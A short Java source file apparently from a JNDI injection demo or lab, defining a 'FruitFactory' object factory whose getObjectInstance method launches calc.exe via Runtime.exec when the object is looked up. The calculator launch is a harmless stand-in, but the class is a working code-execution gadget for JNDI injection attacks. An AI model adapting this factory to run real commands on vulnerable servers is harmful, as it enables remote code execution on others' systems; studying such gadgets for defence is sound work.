package jndi;

import java.io.IOException;
import java.io.Serializable;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class FruitFactory implements Serializable, ObjectFactory {

  public Object getObjectInstance(
    Object info,
    Name name,
    Context nameCtx,
    Hashtable env
  )
    throws IOException {
    Runtime r = Runtime.getRuntime();
    r.exec("calc.exe");
    return new Fruit("fruit");
  }
}
